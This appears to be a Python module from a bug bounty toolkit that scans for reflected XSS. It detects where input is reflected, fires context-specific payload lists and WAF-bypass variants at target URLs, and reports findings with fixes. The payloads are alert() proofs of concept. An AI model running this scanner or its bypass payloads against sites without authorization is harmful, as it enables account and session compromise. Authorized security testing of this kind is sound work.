'''
╭──────────────────────────────────────────────────────────────────────────────╮
│  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗ ██╗  
│  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗╚██╗██╔╝███║  
│  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║██║   ██║ ╚███╔╝  ██║  
│  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║██║   ██║ ██╔██╗  ██║  
│  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝╚██████╔╝██╔╝ ██╗ ██║  
│  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝ ╚═╝  
│                                                                              
│    Bug Bounty Tool Kit  ─  Recon · Scan · Exploit · Report                  
╰── Only scan targets you own or have explicit written permission to test ─────╯
'''
"""
Context-aware XSS payload generator.
Detects where user input is reflected and crafts targeted payloads per context.
"""

import re
import urllib.request
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from data.webfuzz import fetch_url


CONTEXT_TAG_BODY = "html_tag_body"
CONTEXT_ATTR_DOUBLE = "attr_double_quoted"
CONTEXT_ATTR_SINGLE = "attr_single_quoted"
CONTEXT_ATTR_UNQUOTED = "attr_unquoted"
CONTEXT_SCRIPT = "script_block"
CONTEXT_SCRIPT_STRING_DOUBLE = "script_string_double"
CONTEXT_SCRIPT_STRING_SINGLE = "script_string_single"
CONTEXT_HTML_COMMENT = "html_comment"
CONTEXT_JSON = "json_value"
CONTEXT_STYLE = "css_style"
CONTEXT_URL_ATTR = "url_attribute"
CONTEXT_UNKNOWN = "unknown"

CONTEXT_LABELS = {
    CONTEXT_TAG_BODY: "HTML Tag Body",
    CONTEXT_ATTR_DOUBLE: "HTML Attribute (double-quoted)",
    CONTEXT_ATTR_SINGLE: "HTML Attribute (single-quoted)",
    CONTEXT_ATTR_UNQUOTED: "HTML Attribute (unquoted)",
    CONTEXT_SCRIPT: "JavaScript Block",
    CONTEXT_SCRIPT_STRING_DOUBLE: "JavaScript String (double-quoted)",
    CONTEXT_SCRIPT_STRING_SINGLE: "JavaScript String (single-quoted)",
    CONTEXT_HTML_COMMENT: "HTML Comment",
    CONTEXT_JSON: "JSON Value",
    CONTEXT_STYLE: "CSS/Style Block",
    CONTEXT_URL_ATTR: "URL Attribute (href/src/action)",
    CONTEXT_UNKNOWN: "Unknown",
}

PAYLOADS_BY_CONTEXT = {
    CONTEXT_TAG_BODY: [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(document.domain)>',
        '<details open ontoggle=alert(document.domain)>',
        '<body onload=alert(document.domain)>',
        '"><script>alert(document.domain)</script>',
        '<iframe srcdoc="<script>alert(top.document.domain)</script>">',
        '<math><mtext></table></math><img src=x onerror=alert(document.domain)>',
    ],
    CONTEXT_ATTR_DOUBLE: [
        '" onmouseover="alert(document.domain)',
        '" autofocus onfocus="alert(document.domain)',
        '" onclick="alert(document.domain)',
        '">\x3cscript>alert(document.domain)\x3c/script>',
        '" onerror="alert(document.domain)" src="x',
        '" onload="alert(document.domain)" src="//x',
        '" style="animation-name:x" onanimationstart="alert(document.domain)',
    ],
    CONTEXT_ATTR_SINGLE: [
        "' onmouseover='alert(document.domain)",
        "' autofocus onfocus='alert(document.domain)",
        "' onclick='alert(document.domain)",
        "'><script>alert(document.domain)</script>",
        "' onerror='alert(document.domain)' src='x",
    ],
    CONTEXT_ATTR_UNQUOTED: [
        ' onmouseover=alert(document.domain) x=',
        ' autofocus onfocus=alert(document.domain) x=',
        '/onload=alert(document.domain)//',
        ' onclick=alert(document.domain) ',
    ],
    CONTEXT_SCRIPT: [
        '</script><script>alert(document.domain)</script>',
        '</script><img src=x onerror=alert(document.domain)>',
        ';alert(document.domain)//',
        '\nalert(document.domain)//',
        '};alert(document.domain)//',
        '</script><svg onload=alert(document.domain)>',
    ],
    CONTEXT_SCRIPT_STRING_DOUBLE: [
        '";alert(document.domain)//',
        '"-alert(document.domain)-"',
        '";\nalert(document.domain)//',
        '"+alert(document.domain)+"',
        '"};alert(document.domain)//',
        '\\");alert(document.domain)//',
    ],
    CONTEXT_SCRIPT_STRING_SINGLE: [
        "';alert(document.domain)//",
        "'-alert(document.domain)-'",
        "';\nalert(document.domain)//",
        "'+alert(document.domain)+'",
        "'};alert(document.domain)//",
        "\\');alert(document.domain)//",
    ],
    CONTEXT_HTML_COMMENT: [
        '--><script>alert(document.domain)</script>',
        '--><img src=x onerror=alert(document.domain)>',
        '-- ><svg onload=alert(document.domain)>',
        '-->',
    ],
    CONTEXT_JSON: [
        '"};</script><script>alert(document.domain)</script>',
        '"}<img src=x onerror=alert(document.domain)>',
        '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e',
        '"onmouseover="alert(document.domain)',
    ],
    CONTEXT_STYLE: [
        '</style><script>alert(document.domain)</script>',
        'expression(alert(document.domain))',
        ';background:url("javascript:alert(document.domain)")',
        '</style><img src=x onerror=alert(document.domain)>',
    ],
    CONTEXT_URL_ATTR: [
        'javascript:alert(document.domain)',
        'JaVaScRiPt:alert(document.domain)',
        'javascript&#58;alert(document.domain)',
        'data:text/html,<script>alert(document.domain)</script>',
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain)',
    ],
    CONTEXT_UNKNOWN: [
        '<script>alert(document.domain)</script>',
        '"><script>alert(document.domain)</script>',
        "'><script>alert(document.domain)</script>",
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(document.domain)>',
        'javascript:alert(document.domain)',
    ],
}

WAF_BYPASS_PAYLOADS = [
    '<ScRiPt>alert(document.domain)</sCrIpT>',
    '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
    '%3Cscript%3Ealert(document.domain)%3C/script%3E',
    '&#60;script&#62;alert(document.domain)&#60;/script&#62;',
    '<svg/onload=alert(document.domain)>',
    '<svg\tonload=alert(document.domain)>',
    '<img src=1 onerror\x0a=alert(document.domain)>',
    '<<script>alert(document.domain)//<</script>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+">',
    '<iframe src="javascript:alert`document.domain`">',
    '<details open ontoggle=alert`document.domain`>',
    '<svg><script>alert&#40;document.domain&#41;</script>',
    '<input onfocus=alert(document.domain) autofocus>',
    '<video src=_ onloadstart=alert(document.domain) autoplay>',
    '<audio src=_ onloadstart=alert(document.domain) autoplay>',
]


MARKER = "XSSTEST7749"


def detect_reflection_context(body: str, marker: str) -> str:
    if marker not in body:
        return None

    pos = body.find(marker)
    surrounding = body[max(0, pos - 300): pos + 300]

    in_script = bool(re.search(
        r'<script[^>]*>(?:(?!<\/script>).)*' + re.escape(marker),
        body, re.IGNORECASE | re.DOTALL
    ))

    if in_script:
        before_in_script = re.search(
            r'<script[^>]*>((?:(?!<\/script>).)*?)' + re.escape(marker),
            body, re.IGNORECASE | re.DOTALL
        )
        if before_in_script:
            script_content = before_in_script.group(1)
            dq_open = script_content.count('"') % 2
            sq_open = script_content.count("'") % 2
            if dq_open:
                return CONTEXT_SCRIPT_STRING_DOUBLE
            elif sq_open:
                return CONTEXT_SCRIPT_STRING_SINGLE
            else:
                return CONTEXT_SCRIPT

    if re.search(r'<!--(?:(?!-->).)*' + re.escape(marker), body, re.DOTALL):
        return CONTEXT_HTML_COMMENT

    style_match = re.search(
        r'<style[^>]*>(?:(?!<\/style>).)*' + re.escape(marker),
        body, re.IGNORECASE | re.DOTALL
    )
    if style_match:
        return CONTEXT_STYLE

    attr_dq = re.search(r'<[^>]+\s+\w[\w-]*="[^"]*' + re.escape(marker), surrounding)
    if attr_dq:
        attr_name = re.search(r'(href|src|action|data|formaction)\s*=\s*"[^"]*' + re.escape(marker),
                               surrounding, re.IGNORECASE)
        if attr_name:
            return CONTEXT_URL_ATTR
        return CONTEXT_ATTR_DOUBLE

    attr_sq = re.search(r"<[^>]+\s+\w[\w-]*='[^']*" + re.escape(marker), surrounding)
    if attr_sq:
        return CONTEXT_ATTR_SINGLE

    attr_unq = re.search(r'<[^>]+\s+\w[\w-]*=' + re.escape(marker), surrounding)
    if attr_unq:
        return CONTEXT_ATTR_UNQUOTED

    json_ctx = re.search(r'["\{]\s*"[^"]*":\s*"[^"]*' + re.escape(marker), surrounding)
    if json_ctx:
        return CONTEXT_JSON

    tag_ctx = re.search(r'<[^/][^>]*>' + re.escape(marker), surrounding)
    if tag_ctx:
        return CONTEXT_TAG_BODY

    return CONTEXT_TAG_BODY


def get_all_params(url: str) -> dict[str, str]:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: (v[0] if v else "") for k, v in qs.items()}


def discover_params_from_page(response: dict) -> list[str]:
    body = response.get("body", "")
    params = set()

    input_names    = re.findall(r'<input[^>]+name=["\']?([^"\'>\s]+)', body, re.IGNORECASE)
    select_names   = re.findall(r'<select[^>]+name=["\']?([^"\'>\s]+)', body, re.IGNORECASE)
    textarea_names = re.findall(r'<textarea[^>]+name=["\']?([^"\'>\s]+)', body, re.IGNORECASE)
    params.update(input_names + select_names + textarea_names)

    common = ["q", "s", "search", "query", "term", "id", "page", "name", "msg",
              "text", "input", "comment", "title", "url", "path", "ref", "data",
              "content", "value", "username", "user", "email", "redirect", "r",
              "lang", "locale", "category", "tag", "type", "action", "view",
              "mode", "format", "filter", "sort", "order", "keyword", "key"]
    params.update(common)

    return sorted(params)


def probe_param(base_url: str, param: str, timeout: int = 8,
                user_agent: str = "BugBountyTool/1.0") -> Optional[dict]:
    parsed = urllib.parse.urlparse(base_url)
    existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    existing[param] = [MARKER]
    new_qs   = urllib.parse.urlencode(existing, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

    response = fetch_url(test_url, timeout=timeout, user_agent=user_agent, follow_redirects=True)
    if not response:
        return None

    body = response.get("body", "")
    if MARKER not in body:
        return None

    context = detect_reflection_context(body, MARKER)
    return {
        "param":         param,
        "url":           test_url,
        "context":       context,
        "context_label": CONTEXT_LABELS.get(context, context),
        "reflected":     True,
    }


def test_payload(base_url: str, param: str, payload: str, timeout: int = 8,
                 user_agent: str = "BugBountyTool/1.0") -> Optional[dict]:
    parsed = urllib.parse.urlparse(base_url)
    existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    existing[param] = [payload]
    new_qs   = urllib.parse.urlencode(existing, doseq=True)
    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

    response = fetch_url(test_url, timeout=timeout, user_agent=user_agent, follow_redirects=True)
    if not response:
        return None

    body = response.get("body", "")
    if payload in body:
        return {"url": test_url, "payload": payload, "reflected": True, "encoded": False}

    encoded_payload = urllib.parse.quote(payload)
    if encoded_payload in body:
        return {"url": test_url, "payload": payload, "reflected": True, "encoded": True}

    return None


def scan_xss_contexts(
    base_url: str,
    threads: int = 15,
    timeout: int = 8,
    user_agent: str = "BugBountyTool/1.0",
    extra_params: list = None,
    extra_urls: list = None,
) -> list[dict]:
    results = []

    home_response = fetch_url(base_url, timeout=timeout, user_agent=user_agent)
    if not home_response:
        return []

    params = discover_params_from_page(home_response)
    existing_params = list(get_all_params(base_url).keys())
    all_params = list(dict.fromkeys(existing_params + params + (extra_params or [])))

    scan_urls = [base_url] + [u for u in (extra_urls or []) if u != base_url]

    reflection_points = []
    seen_params: set = set()
    probe_jobs = [(url, p) for url in scan_urls for p in all_params]

    # Phase 1: parallel probe for reflection
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(probe_param, url, p, timeout, user_agent): (url, p)
                   for url, p in probe_jobs}
        for future in as_completed(futures):
            result = future.result()
            if result:
                key = f"{result['url']}::{result['param']}"
                if key not in seen_params:
                    seen_params.add(key)
                    reflection_points.append(result)

    if not reflection_points:
        return []

    # Phase 2: parallel payload testing per reflection point
    def _test_rp(rp: dict) -> dict:
        context = rp["context"]
        param   = rp["param"]
        payloads = PAYLOADS_BY_CONTEXT.get(context, PAYLOADS_BY_CONTEXT[CONTEXT_UNKNOWN])

        confirmed_payloads: list[dict] = []
        unencoded_reflected: list[str] = []

        # Test all context payloads in parallel
        with ThreadPoolExecutor(max_workers=min(threads, len(payloads))) as px:
            payload_futures = {px.submit(test_payload, base_url, param, pl, timeout, user_agent): pl
                               for pl in payloads}
            for fut in as_completed(payload_futures):
                pl     = payload_futures[fut]
                result = fut.result()
                if result:
                    if not result["encoded"]:
                        unencoded_reflected.append(result["url"])
                    confirmed_payloads.append({
                        "payload":              pl,
                        "reflected_unencoded":  not result["encoded"],
                        "test_url":             result["url"],
                    })

        waf_bypasses: list[str] = []
        if unencoded_reflected:
            waf_pl = WAF_BYPASS_PAYLOADS[:6]
            with ThreadPoolExecutor(max_workers=min(threads, len(waf_pl))) as px:
                waf_futures = {px.submit(test_payload, base_url, param, pl, timeout, user_agent): pl
                               for pl in waf_pl}
                for fut in as_completed(waf_futures):
                    pl     = waf_futures[fut]
                    result = fut.result()
                    if result and not result["encoded"]:
                        waf_bypasses.append(pl)

        severity = "HIGH" if unencoded_reflected else "MEDIUM"
        return {
            "type":                 "Reflected XSS (Context-Aware)",
            "severity":             severity,
            "param":                param,
            "context":              context,
            "context_label":        CONTEXT_LABELS.get(context, context),
            "description": (
                f"Input in ?{param}= is reflected unencoded inside "
                f"{CONTEXT_LABELS.get(context, context)} context"
            ),
            "url":                  rp["url"],
            "recommendation":       _get_recommendation(context),
            "payloads":             confirmed_payloads,
            "waf_bypass_payloads":  waf_bypasses,
            "confirmed_xss":        bool(unencoded_reflected),
            "unencoded_reflect_urls": unencoded_reflected,
        }

    # Run all reflection points in parallel
    with ThreadPoolExecutor(max_workers=min(threads, len(reflection_points))) as executor:
        futures = {executor.submit(_test_rp, rp): rp for rp in reflection_points}
        for future in as_completed(futures):
            entry = future.result()
            results.append(entry)

    results.sort(key=lambda x: (0 if x["confirmed_xss"] else 1, x["param"]))
    return results


def _get_recommendation(context: str) -> str:
    recs = {
        CONTEXT_TAG_BODY:            "HTML-encode output: escape <, >, &, \", ' before placing in tag bodies",
        CONTEXT_ATTR_DOUBLE:         "HTML-encode attribute values; always quote attributes with double quotes",
        CONTEXT_ATTR_SINGLE:         "HTML-encode attribute values; use double quotes for HTML attributes",
        CONTEXT_ATTR_UNQUOTED:       "Always wrap HTML attribute values in double quotes and HTML-encode the value",
        CONTEXT_SCRIPT:              "Use JSON-encode or textContent instead of direct DOM injection; never break out of script blocks",
        CONTEXT_SCRIPT_STRING_DOUBLE:"JavaScript-encode string values; use JSON.stringify or a safe encoding library",
        CONTEXT_SCRIPT_STRING_SINGLE:"JavaScript-encode string values; use JSON.stringify or a safe encoding library",
        CONTEXT_HTML_COMMENT:        "Do not reflect user input inside HTML comments; remove comment or sanitize",
        CONTEXT_JSON:                "Use JSON encoder; set Content-Type: application/json and escape </script> sequences",
        CONTEXT_STYLE:               "Never reflect user data inside <style> blocks; use CSS sanitization library",
        CONTEXT_URL_ATTR:            "Validate URLs against an allowlist of schemes (https only); block javascript: and data: URIs",
        CONTEXT_UNKNOWN:             "Apply context-aware output encoding; consider DOMPurify for client-side sanitization",
    }
    return recs.get(context, "Apply output encoding appropriate for the context")


def format_report_section(findings: list[dict]) -> str:
    if not findings:
        return ""

    lines = ["\n=== CONTEXT-AWARE XSS ANALYSIS ===\n"]
    for i, f in enumerate(findings, 1):
        lines.append(f"[{i}] {f['context_label']} — ?{f['param']}=")
        lines.append(f"    Severity : {f['severity']}")
        lines.append(f"    Confirmed: {'YES — unencoded reflection confirmed' if f['confirmed_xss'] else 'Potential — reflection detected'}")
        lines.append(f"    URL      : {f['url']}")
        lines.append(f"    Fix      : {f['recommendation']}")
        if f["payloads"]:
            lines.append(f"    Payloads ({len(f['payloads'])}):")
            for p in f["payloads"][:5]:
                status = "✓ UNENCODED" if p["reflected_unencoded"] else "~ encoded"
                lines.append(f"      [{status}] {p['payload']}")
        if f["waf_bypass_payloads"]:
            lines.append(f"    WAF Bypasses that worked:")
            for bp in f["waf_bypass_payloads"]:
                lines.append(f"      {bp}")
        lines.append("")

    return "\n".join(lines)


if __name__ == "__main__":
    pass
